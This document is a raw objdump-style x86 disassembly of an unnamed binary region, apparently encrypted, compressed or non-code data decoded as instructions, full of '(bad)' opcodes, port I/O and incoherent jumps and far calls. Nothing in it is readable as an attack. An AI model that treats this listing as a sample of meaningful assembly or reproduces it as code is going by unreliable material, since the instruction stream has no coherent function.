  428a1d:	sub    esi,DWORD PTR [edx+0xa]
  428a20:	test   eax,0xaa4c9636
  428a25:	or     ah,al
  428a27:	dec    edi
  428a28:	push   ds
  428a29:	lahf   
  428a2a:	lods   al,BYTE PTR ds:[esi]
  428a2b:	mov    cs,WORD PTR es:[eax+0x77]
  428a2f:	cmp    eax,0x99de25cf
  428a34:	inc    ebx
  428a35:	jbe    0x4289bb
  428a37:	mov    edi,0x25f37624
  428a3c:	(bad)
  428a3f:	int    0xb
  428a41:	int    0x91
  428a43:	push   0xffffffae
  428a45:	adc    BYTE PTR [esi],cl
  428a47:	xor    DWORD PTR [esi-0x33],esi
  428a4a:	ror    BYTE PTR [eax+0x62d13362],cl
  428a50:	xchg   ebp,eax
  428a51:	xlat   BYTE PTR cs:[ebx]
  428a53:	repz mov esi,0x9c4c7242
  428a59:	in     al,dx
  428a5a:	(bad)  
  428a5b:	mov    cs,WORD PTR [eax+0x62]
  428a5e:	push   ss
  428a5f:	test   eax,0xd6d14215
  428a64:	pushf  
  428a65:	mov    ds:0xebf43a32,eax
  428a6a:	mov    edi,0x68c923
	...
  428ad3:	add    BYTE PTR [eax],al
  428ad5:	add    BYTE PTR [ebp+0xc],cl
  428ad8:	clc    
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax+0x26950d13]
  428ae5:	xchg   edx,eax
  428ae6:	addr16 mov ah,0x1
  428ae9:	add    BYTE PTR [eax],al
  428aeb:	add    DWORD PTR [eax],eax
  428aed:	add    BYTE PTR [esi],bl
  428aef:	push   edi
  428af0:	into   
  428af1:	mov    al,dh
  428af3:	js     0x428b1a
  428af5:	daa    
  428af6:	sub    ecx,ebx
  428af8:	das    
  428af9:	pop    ebp
  428afa:	inc    ebp
  428afb:	push   ds
  428afc:	xchg   esp,eax
  428afd:	pop    es
  428afe:	xchg   DWORD PTR [ebx],eax
  428b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b01:	push   edi
  428b02:	out    0xac,al
  428b04:	add    bh,dh
  428b06:	and    DWORD PTR [ecx+0x37],eax
  428b09:	sahf   
  428b0a:	cdq    
  428b0b:	jns    0x428adc
  428b0d:	int    0x56
  428b0f:	xor    DWORD PTR [esi+eax*1-0xc],0xffffffcc
  428b14:	int    0x59
  428b16:	xchg   esi,eax
  428b17:	pop    edx
  428b18:	out    dx,eax
  428b19:	adc    al,0xb2
  428b1b:	ror    DWORD PTR [edx],1
  428b1d:	mov    esp,0x86ef6482
  428b22:	sbb    esp,ecx
  428b24:	(bad)  
  428b25:	xchg   edi,eax
  428b26:	popa   
  428b27:	jmp    0xbab2f29f
  428b2c:	das    
  428b2d:	pop    eax
  428b2e:	daa    
  428b2f:	lock (bad) 
  428b31:	cwde   
  428b32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b33:	push   0xcb2a069c
  428b38:	loope  0x428ac5
  428b3a:	adc    esp,edi
  428b3c:	test   edx,ebx
  428b3e:	dec    sp
  428b40:	and    esp,ecx
  428b42:	inc    ebp
  428b43:	cmp    al,0x44
  428b45:	adc    dh,ah
  428b47:	imul   ebx,DWORD PTR [edx],0xe34c5182
  428b4d:	xchg   DWORD PTR [ebx-0x4525371f],edi
  428b53:	ret    0xa6cb
  428b56:	mov    ch,0x36
  428b58:	push   ebx
  428b59:	mov    ecx,edi
  428b5b:	shl    BYTE PTR [ecx+ebp*2-0x48e36e01],1
  428b62:	fst    DWORD PTR [edx]
  428b64:	shl    BYTE PTR [ebx+eiz*4+0x6e],0xb8
  428b69:	call   0xc437:0x244598af
  428b70:	popf   
  428b71:	mov    ds:0xf7f9b0cc,eax
  428b76:	cmp    DWORD PTR [esi+0x4e],0x6c
  428b7a:	or     eax,0xe3915677
  428b7f:	add    BYTE PTR [ecx+0x37a13195],cl
  428b85:	outs   dx,BYTE PTR ds:[esi]
  428b86:	inc    edi
  428b87:	xor    al,0xfb
  428b89:	cmp    DWORD PTR [ebp+edi*2-0x4f],0x49
  428b8e:	sub    edi,DWORD PTR [esi+esi*1]
  428b91:	lds    ebp,FWORD PTR [edx+eiz*2+0x56]
  428b95:	fs fdivr st,st(3)
  428b98:	scas   eax,DWORD PTR es:[edi]
  428b99:	lods   eax,DWORD PTR ds:[esi]
  428b9a:	pop    ss
  428b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b9c:	sub    al,0x2a
  428b9e:	lea    edx,[eax]
  428ba0:	retf   
  428ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ba2:	push   ss
  428ba3:	loop   0x428b8c
  428ba5:	add    eax,0xbfa7f6c7
  428baa:	xor    esi,0x78e7817
  428bb0:	mov    ecx,0x34573832
  428bb5:	pop    eax
  428bb6:	xor    eax,0x921666c4
  428bbb:	fadd   st(1),st
  428bbd:	cli    
  428bbe:	mov    edi,0xf9c348f1
  428bc3:	cmovb  edx,DWORD PTR [ebx+0x62]
  428bc7:	push   cs
  428bc8:	mov    eax,ds:0xf563de84
  428bcd:	call   0xb3cf23be
  428bd2:	test   BYTE PTR [ecx+0x1f3a4180],dh
  428bd8:	jecxz  0x428bb8
  428bda:	(bad)  
  428bdb:	jl     0x428bf5
  428bdd:	pop    ds
  428bde:	mov    edi,0x99c251c0
  428be3:	fistp  QWORD PTR [ecx]
  428be5:	inc    esp
  428be6:	call   0xe9d6:0xd9b7f0b2
  428bed:	cwde   
	...
  428c56:	lds    edx,FWORD PTR [ebp-0x76]
  428c59:	cli    
  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0x8ccbf8f8
  428c66:	addr16 mov ch,0x1
  428c69:	add    BYTE PTR [eax],al
  428c6b:	add    DWORD PTR [eax],eax
  428c6d:	add    BYTE PTR [ecx+ecx*8],al
  428c70:	cmp    eax,0xa7f5d9d2
  428c75:	enter  0xe66c,0xed
  428c79:	in     al,0x85
  428c7b:	push   es
  428c7c:	mov    BYTE PTR [edi],al
  428c7e:	enter  0xc78a,0x6e
  428c82:	xor    ecx,edx
  428c84:	push   ss
  428c85:	(bad)  
  428c86:	mov    ah,0x10
  428c88:	cmp    eax,0x93f04b9c
  428c8d:	loope  0x428c9d
  428c8f:	cli    
  428c90:	dec    eax
  428c91:	loope  0x428c23
  428c93:	push   0x2
  428c95:	mov    dh,0x2b
  428c97:	loope  0x428c76
  428c99:	imul   esi,DWORD PTR [edx-0x1b2ce1c0],0xffffffdc
  428ca0:	fldenv [ebx]
  428ca2:	xor    ecx,DWORD PTR [ebp-0x3d770bdc]
  428ca8:	mov    cl,0xfc
  428caa:	xor    ebp,ebx
  428cac:	mul    DWORD PTR [edi-0x21ba02dd]
  428cb2:	jle    0x428caf
  428cb4:	ret    
  428cb5:	gs sbb eax,0xcf4d0146
  428cbb:	fist   DWORD PTR [ebx]
  428cbd:	cmp    edi,DWORD PTR [ebp+edi*8+0x7a]
  428cc1:	or     eax,0x4a4afeec
  428cc6:	mov    cl,0x56
  428cc8:	addr16 dec ebp
  428cca:	sbb    DWORD PTR [ebx+0x70],ebp
  428ccd:	push   edx
  428cce:	add    bl,BYTE PTR [eax-0x6284e166]
  428cd4:	mov    edx,0x1bb1ea59
  428cd9:	cmp    al,0x1a
  428cdb:	sbb    eax,ecx
  428cdd:	pop    ebx
  428cde:	and    al,0x56
  428ce0:	hlt    
  428ce1:	retf   
  428ce2:	jmp    0x428d0f
  428ce4:	adc    BYTE PTR [edi+0x56db887c],ch
  428cea:	add    bh,BYTE PTR [esi+0x3965a40f]
  428cf0:	std    
  428cf1:	cmp    ch,bl
  428cf3:	lea    eax,[edi+eiz*8+0x46]
  428cf7:	mov    ecx,0xa85f87d4
  428cfc:	pop    esp
  428cfd:	je     0x428d2f
  428cff:	add    al,al
  428d01:	and    cl,ah
  428d03:	fmul   QWORD PTR [ecx]
  428d05:	dec    esi
  428d06:	or     ah,BYTE PTR [ebx]
  428d08:	aad    0xda
  428d0a:	pop    ss
  428d0b:	stos   BYTE PTR es:[edi],al
  428d0c:	inc    esi
  428d0d:	inc    ecx
  428d0e:	shr    DWORD PTR [esi+edx*8-0x63],0x6
  428d13:	mov    bl,0x7d
  428d15:	and    eax,0xf67c43aa
  428d1a:	mov    BYTE PTR [ebx+edx*2-0x464f5528],dl
  428d21:	out    dx,eax
  428d22:	aas    
  428d23:	or     eax,0x34e9d7d8
  428d28:	xor    esp,edx
  428d2a:	sub    DWORD PTR [ebx-0x62815f16],eax
  428d30:	or     esi,edx
  428d32:	mov    cl,0x3e
  428d34:	mov    ds:0xb47c54ce,eax
  428d39:	xor    ah,BYTE PTR [edx-0x21]
  428d3c:	pop    es
  428d3d:	ret    0xa53e
  428d40:	and    eax,DWORD PTR [edx]
  428d42:	push   0xffffff9e
  428d44:	test   BYTE PTR [ecx+0xd],cl
  428d47:	inc    edx
  428d48:	mov    bl,0x29
  428d4a:	push   ebx
  428d4b:	pop    esp
  428d4c:	repz mov ebp,0xd4ea2451
  428d52:	cmp    eax,0xb3730d4d
  428d57:	cmp    eax,0xb9960657
  428d5c:	sub    BYTE PTR [ebp-0x231726e3],ah
  428d62:	xchg   ecx,eax
  428d63:	inc    ebp
  428d64:	jno    0x428ce7
  428d66:	arpl   WORD PTR ds:0x386a93ef,bx
  428d6c:	jne    0x428da0
	...
  428dd6:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0xe6cb
  428de4:	fistp  WORD PTR [ebp+0x67]
  428de7:	mov    dh,0x1
  428de9:	add    BYTE PTR [eax],al
  428deb:	add    DWORD PTR [eax],eax
  428ded:	add    BYTE PTR [ebp-0x4b],cl
  428df0:	xor    BYTE PTR [eax],dh
  428df2:	and    dh,al
  428df4:	test   eax,0x62627f9e
  428df9:	adc    DWORD PTR [ebp+0x5580d060],esi
  428dff:	sbb    al,0x9d
  428e01:	ror    DWORD PTR [edi+edi*8],1
  428e04:	pop    esp
  428e05:	sbb    BYTE PTR [edx+ebx*4],bl
  428e08:	pop    ss
  428e09:	ds loop 0x428daa
  428e0c:	fcomp  DWORD PTR cs:[edx-0x7b5829e2]
  428e13:	xchg   DWORD PTR [ecx+0x5c],eax
  428e16:	aas    
  428e17:	cs push es
  428e19:	xor    eax,0xf92541ae
  428e1e:	fwait
  428e1f:	stos   DWORD PTR es:[edi],eax
  428e20:	mov    ebx,0x6ad113e5
  428e25:	or     ebp,ecx
  428e27:	adc    bl,BYTE PTR ds:0x78839064
  428e2d:	push   cs
  428e2e:	add    dh,BYTE PTR [eax+edi*4-0x5bf7015f]
  428e35:	or     edx,0x5d9c64fa
  428e3b:	sub    DWORD PTR [edi+0x260fdaef],eax
  428e41:	xlat   BYTE PTR ds:[ebx]
  428e42:	push   0x47eb0fbc
  428e47:	adc    eax,0x4a0e9a69
  428e4c:	adc    esi,DWORD PTR [ecx+edx*1]
  428e4f:	jae    0x428e2c
  428e51:	jmp    0x49f2a726
  428e56:	or     esi,DWORD PTR [eax-0x61]
  428e59:	sbb    dh,BYTE PTR [ecx-0x17]
  428e5c:	jbe    0x428e31
  428e5e:	shl    BYTE PTR [ebx-0x10],cl
  428e61:	ins    BYTE PTR es:[edi],dx
  428e62:	mov    ebx,0x4e05b949
  428e67:	pop    ebx
  428e68:	daa    
  428e69:	and    edi,DWORD PTR fs:[eax-0x691578d0]
  428e70:	adc    bl,BYTE PTR [edx+0x21]
  428e73:	repz cmp BYTE PTR [edx+0x2a89422f],0x71
  428e7b:	aam    0xae
  428e7d:	xor    al,0x4d
  428e7f:	push   ebp
  428e80:	sub    al,0xa5
  428e82:	std    
  428e83:	das    
  428e84:	retf   0xe947
  428e87:	mov    ?,WORD PTR [eax+0x4d]
  428e8a:	mov    WORD PTR [ebp+0x24787b51],fs
  428e90:	mov    esi,0xe87f6355
  428e95:	sti    
  428e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e97:	xchg   ebx,eax
  428e98:	sub    eax,0x7efab502
  428e9d:	and    BYTE PTR [edi-0x2],cl
  428ea0:	repz pusha 
  428ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ea3:	pushf  
  428ea4:	cmp    dh,BYTE PTR [ebx+0x10]
  428ea7:	enter  0x73ab,0xaf
  428eab:	jl     0x428e68
  428ead:	adc    eax,0x6c5227f
  428eb2:	in     al,0x17
  428eb4:	xor    DWORD PTR [ebx-0x1d],ebp
  428eb7:	sbb    al,0xbd
  428eb9:	add    BYTE PTR [edx+0x2baf248],bl
  428ebf:	call   0x16cd:0x83399874
  428ec6:	pop    si
  428ec8:	(bad)  
  428ec9:	fwait
  428eca:	jmp    0x428e5a
  428ecc:	dec    ebp
  428ecd:	loope  0x428eb8
  428ecf:	or     DWORD PTR [eax],ebp
  428ed1:	jae    0x428f16
  428ed3:	cmp    ecx,esp
  428ed5:	sub    edx,DWORD PTR [ebp-0x17]
  428ed8:	xor    DWORD PTR [ebx+0x7bb190ac],esp
  428ede:	je     0x428f1d
  428ee0:	jmp    0x428ed0
  428ee2:	addps  xmm7,XMMWORD PTR ds:0x989d0d0
  428ee9:	sub    esi,DWORD PTR [ecx+0x4f2fa]
	...
  428f53:	add    BYTE PTR [eax],al
  428f55:	add    BYTE PTR [edi+0x5d],cl
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0x2c
  428f63:	cmp    DWORD PTR [ebx-0x36],ebp
  428f66:	addr16 mov bh,0x1
  428f69:	add    BYTE PTR [eax],al
  428f6b:	add    DWORD PTR [eax],eax
  428f6d:	add    BYTE PTR [eax+ebp*4+0x19],ch
  428f71:	sbb    al,0xb3
  428f73:	or     edx,DWORD PTR [ebp+0x78f75344]
  428f79:	cmc    
  428f7a:	int3   
  428f7b:	sub    DWORD PTR [ebx],eax
  428f7d:	push   ss
  428f7e:	adc    DWORD PTR [edi+0x69bf33b3],eax
  428f84:	or     eax,0x3cac2e29
  428f89:	out    dx,eax
  428f8a:	aaa    
  428f8b:	adc    eax,0xc565861f
  428f90:	popa   
  428f91:	fs mov edi,0x88358d45
  428f97:	add    BYTE PTR [ecx+0x40],dl
  428f9a:	mov    ebp,ecx
  428f9c:	ret    
  428f9d:	mov    dh,0xf7
  428f9f:	and    bh,BYTE PTR [ebx]
  428fa1:	fsubr  DWORD PTR [edx]
  428fa3:	sar    DWORD PTR [ebx+0x1bc3f644],cl
  428fa9:	ror    DWORD PTR [ebx+eax*4],1
  428fac:	pop    eax
  428fad:	and    DWORD PTR [eax-0x1f],esi
  428fb0:	cmp    al,0x76
  428fb2:	mov    dl,0x8a
  428fb4:	scas   al,BYTE PTR es:[edi]
  428fb5:	fild   QWORD PTR [ebx+0x5e]
  428fb8:	mov    esp,0xec1fbd6b
  428fbd:	sub    eax,0xeb16c5d
  428fc2:	sbb    eax,0xd090d547
  428fc7:	or     eax,0xdc6a5e7c
  428fcc:	sbb    eax,0x6cfeabf7
  428fd1:	add    bl,BYTE PTR [eax+0x5c03f59a]
  428fd7:	iret   
  428fd8:	test   BYTE PTR [edi-0x54],al
  428fdb:	adc    dl,ah
  428fdd:	sahf   
  428fde:	pushf  
  428fdf:	rcl    DWORD PTR [ebx+0x7e],0x51
  428fe3:	mov    DWORD PTR [esp+ecx*2],esi
  428fe6:	lahf   
  428fe7:	cmp    al,0x31
  428fe9:	jmp    0x428fc4
  428feb:	push   ss
  428fec:	gs in  al,0x32
  428fef:	sahf   
  428ff0:	rcl    ebx,cl
  428ff2:	mov    ds:0xa7dd2e1,al
  428ff7:	pop    edx
  428ff8:	xor    eax,0xa4fbfea0
  428ffd:	xor    BYTE PTR [eax+0x760be227],cl
  429003:	popa   
  429004:	retf   
  429005:	loop   0x428fe5
  429007:	cmp    al,0x5
  429009:	inc    ebp
  42900a:	mov    ds:0x9e8293cf,eax
  42900f:	mov    edx,0x646149de
  429014:	sbb    eax,0xe3abe69f
  429019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42901a:	ds pop esp
  42901c:	cld    
  42901d:	cli    
  42901e:	into   
  42901f:	and    dh,BYTE PTR [edi+eiz*2+0x43ff240e]
  429026:	out    0xa1,eax
  429028:	(bad)  [edi+0x318644b]
  42902e:	push   ebx
  42902f:	mov    dh,0xed
  429031:	ret    0xb028
  429034:	sub    DWORD PTR [edi+0x4f],esp
  429037:	ds retfw 0x5667
  42903c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42903d:	sbb    ebx,DWORD PTR [ecx+ebp*8]
  429040:	loopne 0x428fdd
  429042:	daa    
  429043:	mov    bl,0xea
  429045:	aas    
  429046:	jns    0x428fce
  429048:	jne    0x429042
  42904a:	push   ebp
  42904b:	out    dx,eax
  42904c:	mov    ch,BYTE PTR ds:0xe59e029e
  429052:	jbe    0x429093
  429054:	inc    al
  429056:	mov    bl,0x63
  429058:	scas   al,BYTE PTR es:[edi]
  429059:	xchg   BYTE PTR [eax-0x2c40d76e],ch
  42905f:	xor    bh,BYTE PTR [ebp+0x6]
  429062:	xchg   esp,eax
  429063:	xlat   BYTE PTR ds:[ebx]
  429064:	push   ecx
  429065:	loopne 0x42901c
  429067:	hlt    
  429068:	jecxz  0x42905b
  42906a:	mov    edx,0xe3d973
	...
  4290d3:	add    BYTE PTR [eax],al
  4290d5:	add    cl,ah
  4290d7:	in     al,dx
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0x43fc7b77
  4290e3:	dec    edi
  4290e4:	mov    ss,edx
  4290e6:	addr16 mov eax,0x1000001
  4290ec:	add    BYTE PTR [eax],al
  4290ee:	sbb    BYTE PTR [bx+di],cl
  4290f1:	dec    BYTE PTR [ebx-0x4173771]
  4290f7:	cmp    ah,BYTE PTR [edi-0xf9a6015]
  4290fd:	adc    esp,DWORD PTR [eax]
  4290ff:	inc    esi
  429100:	les    ebx,FWORD PTR [eax-0x2fcf1cee]
  429106:	scas   eax,DWORD PTR es:[edi]
  429107:	xor    DWORD PTR [esi-0x20],esp
  42910a:	neg    DWORD PTR [esi+eax*1-0x3b45f598]
  429111:	call   0x3231954c
  429116:	jae    0x429130
  429118:	xor    BYTE PTR [eax+0x42c2756a],dh
  42911e:	mov    edx,0x66dd5061
  429123:	add    DWORD PTR [ecx-0x73982305],esp
  429129:	cmp    ecx,DWORD PTR [eax+0x3cec9582]
  42912f:	dec    eax
  429130:	enter  0x614f,0x42
  429134:	and    al,0x21
  429136:	dec    eax
  429137:	sub    BYTE PTR [ebx+esi*8],dh
  42913a:	lahf   
  42913b:	gs scas eax,DWORD PTR es:[edi]
  42913d:	inc    edx
  42913e:	or     al,0xb4
  429140:	dec    esp
  429141:	or     edi,DWORD PTR [ebx-0x69fc95bb]
  429147:	lods   al,BYTE PTR ds:[esi]
  429148:	mov    dh,0xb7
  42914a:	dec    esi
  42914b:	inc    edi
  42914c:	test   BYTE PTR ds:0x4bd394b6,0xdd
  429153:	mov    bh,0x31
  429155:	out    dx,al
  429156:	aad    0x69
  429158:	shl    cl,1
  42915a:	mov    ds:0x39aeaeb9,eax
  42915f:	push   0x3d
  429161:	mov    edi,edx
  429163:	gs in  al,0x6f
  429166:	or     BYTE PTR [ecx],dl
  429168:	mov    ds:0x599cf8ef,eax
  42916d:	sub    bh,BYTE PTR [ebx-0x4649b74c]
  429173:	xchg   ebx,eax
  429174:	mov    al,0xfb
  429176:	ins    BYTE PTR es:[edi],dx
  429177:	stos   BYTE PTR es:[edi],al
  429178:	imul   ebp,esi,0x66
  42917b:	out    dx,al
  42917c:	mov    ecx,0xf5fc0b3e
  429181:	mov    ebx,0xee31a530
  429186:	pop    es
  429187:	add    ah,BYTE PTR gs:[edx+ecx*4+0x3f]
  42918c:	mov    dl,0x3a
  42918e:	sub    dl,BYTE PTR [edx-0x1c8ce0a3]
  429194:	cmp    esi,DWORD PTR [esi-0x78239852]
  42919a:	sets   bl
  42919d:	aad    0xc2
  42919f:	mov    dh,0x6a
  4291a1:	scas   eax,DWORD PTR es:[edi]
  4291a2:	int3   
  4291a3:	push   0xca9ff678
  4291a8:	dec    edx
  4291a9:	adc    al,0xa2
  4291ab:	ins    DWORD PTR es:[edi],dx
  4291ac:	cmp    esi,edi
  4291ae:	in     eax,0x54
  4291b0:	mov    eax,0x609c4395
  4291b5:	mov    ds:0xcee853b2,al
  4291ba:	or     edi,0x2cc06f84
  4291c0:	bound  esp,QWORD PTR [edi-0x7ab2f90a]
  4291c6:	mov    dl,dl
  4291c8:	adc    dl,BYTE PTR [eax+0x49]
  4291cb:	sar    BYTE PTR [ebp+0x38],cl
  4291ce:	and    DWORD PTR [ecx+0x24a6608f],0xffffff94
  4291d5:	xlat   BYTE PTR ds:[ebx]
  4291d6:	push   eax
  4291d7:	and    BYTE PTR [eax-0x676c43a0],bh
  4291dd:	sti    
  4291de:	push   es
  4291df:	nop
  4291e0:	(bad)  
  4291e1:	xor    DWORD PTR [edi],ecx
  4291e3:	lahf   
  4291e4:	mov    ebp,eax
  4291e6:	xchg   ebx,eax
  4291e7:	sbb    DWORD PTR [edx-0x2],eax
  4291ea:	sub    al,0x1c
  4291ec:	pop    esp
  4291ed:	inc    ecx
	...
  429256:	push   esi
  429257:	xchg   ebp,edi
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [ebp+edx*2+0x6707a7fe],0x1b9
  42926b:	add    DWORD PTR [eax],eax
  42926d:	add    BYTE PTR [edx+0x2b6ed9ca],ch
  429273:	pop    edi
  429274:	xchg   BYTE PTR [edx+0x3],bh
  429277:	jnp    0x42921a
  429279:	jl     0x42922c
  42927b:	arpl   WORD PTR [edi+0x3d],di
  42927e:	mov    ch,0xdb
  429280:	outs   dx,BYTE PTR ds:[esi]
  429281:	push   cs
  429282:	dec    eax
  429283:	push   edi
  429284:	loope  0x42921f
  429286:	sahf   
  429287:	popa   
  429288:	mov    fs,esi
  42928a:	pop    ebp
  42928b:	cmp    dl,BYTE PTR [esp-0x68]
  42928f:	jnp    0x429269
  429291:	push   ds
  429292:	leave  
  429293:	pop    eax
  429294:	or     BYTE PTR [ecx+0x6f1dac4c],bh
  42929a:	aam    0xac
  42929c:	dec    ebp
  42929d:	add    al,0x41
  42929f:	jl     0x429224
  4292a1:	fisubr WORD PTR gs:[ebx]
  4292a4:	loop   0x42927e
  4292a6:	jecxz  0x4292ac
  4292a8:	out    0x3c,eax
  4292aa:	ja     0x42929f
  4292ac:	les    edx,FWORD PTR [edx]
  4292ae:	pop    edi
  4292af:	inc    eax
  4292b0:	or     al,0xc
  4292b2:	adc    BYTE PTR [esi+edx*1+0x26],0x1
  4292b7:	or     ebp,DWORD PTR [esi-0x2e560428]
  4292bd:	or     DWORD PTR cs:[ecx-0x29],esp
  4292c1:	push   edi
  4292c2:	das    
  4292c3:	popa   
  4292c4:	aaa    
  4292c5:	call   0xea4d:0xf7541fac
  4292cc:	aas    
  4292cd:	xchg   edi,eax
  4292ce:	push   es
  4292cf:	ret    0x15df
  4292d2:	fisubr DWORD PTR [eax+0x577c6a9b]
  4292d8:	mov    eax,ds:0x54fc8dcb
  4292dd:	(bad)  
  4292de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292df:	dec    edx
  4292e0:	jle    0x429309
  4292e2:	mov    bh,0x1
  4292e4:	pop    di
  4292e6:	sub    edx,DWORD PTR ds:0xdcd3e31
  4292ec:	rol    BYTE PTR [ebp-0x4abf268d],0x98
  4292f3:	sub    eax,0x2de43339
  4292f8:	sbb    eax,DWORD PTR [eax+0x12bf7fb2]
  4292fe:	gs pop esi
  429300:	jno    0x429328
  429302:	repz mov ch,0x1f
  429305:	enter  0xfd61,0x63
  429309:	adc    al,0xa
  42930b:	leave  
  42930c:	mov    ?,WORD PTR [esi+0x8375f84]
  429312:	test   al,ah
  429314:	rcl    BYTE PTR [esi],cl
  429316:	or     cl,ah
  429318:	jno    0x429392
  42931a:	ins    DWORD PTR es:[edi],dx
  42931b:	or     edi,edx
  42931d:	mov    al,ds:0x2ca28297
  429322:	cmp    ch,BYTE PTR [ebp+0x48a5b39]
  429328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429329:	popa   
  42932a:	mov    eax,0x96d2846b
  42932f:	jp     0x42931d
  429331:	adc    edx,ecx
  429333:	mov    al,ds:0xdf5a9a96
  429338:	xchg   edx,eax
  429339:	aas    
  42933a:	sbb    BYTE PTR [esi],cl
  42933c:	sub    ch,dl
  42933e:	cld    
  42933f:	adc    al,0x50
  429341:	dec    esp
  429342:	sub    al,0xc4
  429344:	jns    0x4293a5
  429346:	add    esp,DWORD PTR [esi]
  429348:	pop    ecx
  429349:	enter  0x2b2f,0x77
  42934d:	cmp    BYTE PTR [ebp-0x4a99a8d2],dh
  429353:	push   ecx
  429354:	gs call 0xb9e2:0xe0d314be
  42935c:	lahf   
  42935d:	retf   0x2889
  429360:	inc    BYTE PTR [esi+ebp*8-0x2d573e21]
  429367:	mov    al,0xe
  429369:	jne    0x4292ff
  42936b:	test   DWORD PTR [edi-0x60],ebp
	...
  4293d6:	lock adc al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0xf2
  4293e3:	(bad)  
  4293e4:	stc    
  4293e5:	pusha  
  4293e6:	addr16 mov edx,0x1000001
  4293ec:	add    BYTE PTR [eax],al
  4293ee:	cmp    eax,0x286cf3b1
  4293f3:	sub    BYTE PTR [bx],bl
  4293f6:	scas   al,BYTE PTR es:[edi]
  4293f7:	sbb    ecx,DWORD PTR [edi+0x74]
  4293fa:	dec    ebp
  4293fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4293fc:	mov    al,0xb8
  4293fe:	fwait
  4293ff:	jnp    0x4293b9
  429401:	icebp  
  429402:	cmp    eax,0x8dde967f
  429407:	rol    DWORD PTR [eax+ebx*8-0x77],cl
  42940b:	and    eax,0x10b75115
  429410:	retf   0x8278
  429413:	(bad)  
  429414:	jnp    0x4293e4
  429416:	mov    ss,WORD PTR [ebp+0x30]
  429419:	jmp    0x42940e
  42941b:	jp     0x429480
  42941d:	(bad)  
  42941e:	outs   dx,BYTE PTR ds:[esi]
  42941f:	sub    eax,0x54cd748c
  429424:	mov    eax,cs:0xc53d1b78
  42942a:	aad    0xc9
  42942c:	mov    ebp,0xa3581a0b
  429431:	inc    esi
  429432:	in     al,0xdc
  429434:	or     eax,0x5bd56239
  429439:	(bad)  
  42943a:	adc    dh,BYTE PTR es:[eax]
  42943d:	dec    edi
  42943e:	sti    
  42943f:	in     al,dx
  429440:	xor    al,0x57
  429442:	jg     0x429480
  429444:	sub    al,0x94
  429446:	ret    0xbb8e
  429449:	push   ecx
  42944a:	inc    ebp
  42944b:	push   es
  42944c:	ins    DWORD PTR es:[edi],dx
  42944d:	fisttp DWORD PTR ds:0xc74aea1
  429453:	inc    eax
  429454:	in     al,0x63
  429456:	repz in al,0x68
  429459:	sub    BYTE PTR [ecx-0x49ca02a8],al
  42945f:	or     DWORD PTR [ebx],ebx
  429461:	mov    edx,0xd44c3784
  429466:	fcmovb st,st(1)
  429468:	shr    BYTE PTR [edx+0x57e196ca],cl
  42946e:	adc    ch,BYTE PTR [esp+edi*4+0x3]
  429472:	sbb    eax,ebp
  429474:	and    al,0x5c
  429476:	mov    ebp,0xdd77e8cd
  42947b:	shl    DWORD PTR [ebp-0x1b],cl
  42947e:	dec    dh
  429480:	std    
  429481:	dec    edi
  429482:	mov    ds:0x6dcd6e9,eax
  429487:	cmp    al,0xb4
  429489:	(bad)  
  42948a:	addr16 jne 0x4294b5
  42948d:	jg     0x42944c
  42948f:	lods   al,BYTE PTR ds:[esi]
  429490:	push   eax
  429491:	int3   
  429492:	mov    BYTE PTR [ebx-0x1c],bl
  429495:	jae    0x429478
  429497:	jmp    0x67a0bb86
  42949c:	pop    esi
  42949d:	sbb    ebp,ebx
  42949f:	imul   esp,DWORD PTR [ebp+0x788eb37a],0x1f8ea7a1
  4294a9:	inc    esi
  4294aa:	pop    esi
  4294ab:	add    DWORD PTR [ebp+0x4afd4cfe],edi
  4294b1:	das    
  4294b2:	lods   eax,DWORD PTR ds:[esi]
  4294b3:	sub    ah,0x6f
  4294b6:	in     eax,0xa0
  4294b8:	push   edi
  4294b9:	xor    DWORD PTR [esi+0x444cbfea],0x430164c8
  4294c3:	fist   DWORD PTR [eax+eax*8-0x7c]
  4294c7:	cmp    DWORD PTR [eax-0x604f7ebf],ecx
  4294cd:	sub    ax,0xa9bf
  4294d1:	pushf  
  4294d2:	mov    bl,0x51
  4294d4:	sahf   
  4294d5:	or     BYTE PTR [ecx],0xa5
  4294d8:	aas    
  4294d9:	test   eax,0x90972cdb
  4294de:	fsub   DWORD PTR [ebx]
  4294e0:	paddd  mm2,QWORD PTR [ecx]
  4294e3:	dec    esp
  4294e4:	add    DWORD PTR ds:0xe9be2301,edi
  4294ea:	daa    
  4294eb:	cmp    eax,0xda20
	...
  429554:	add    BYTE PTR [eax],al
  429556:	dec    esp
  429557:	or     eax,0x3e532c13
  42955c:	jg     0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp+0x1caab5ea],dx
  429565:	fs addr16 mov ebx,0x1000001
  42956c:	add    BYTE PTR [eax],al
  42956e:	sub    DWORD PTR [ebx-0x23],0x2f
